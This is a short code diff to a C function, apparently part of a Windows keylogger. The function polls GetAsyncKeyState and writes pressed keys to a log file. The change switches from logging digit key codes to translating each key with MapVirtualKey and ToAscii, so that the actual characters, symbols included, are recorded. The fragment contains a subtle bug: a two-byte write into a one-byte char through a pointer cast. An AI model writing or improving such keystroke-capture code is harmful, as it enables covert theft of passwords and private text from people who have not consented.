@@ -88,7 +88,14 @@ void log_keyboard_state( FILE * log_file )
 		{
 			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
 			{
-				log_infos( log_file, "%01d", i - VK_0 );
+				int scan_code = MapVirtualKey( i, 0 );
+				char ascii_char;
+				// ToAscii returns a numeric key [0..9] or a special key : [@,$,%,...]
+				if( ToAscii( i, scan_code, ( BYTE * ) keyboard_state, ( LPWORD ) &ascii_char, 0 ) == 1 )
+				// If a character has been retrieved
+				{
+					log_infos( log_file, "%c", ascii_char );
+				}
 			}
 		}
 		
@@ -117,6 +124,8 @@ void log_keyboard_state( FILE * log_file )
 				log_infos( log_file, "%s", VKS_MATH_TXT[i] );
 			}
 		}
+		
+		
 		
 	}
 }
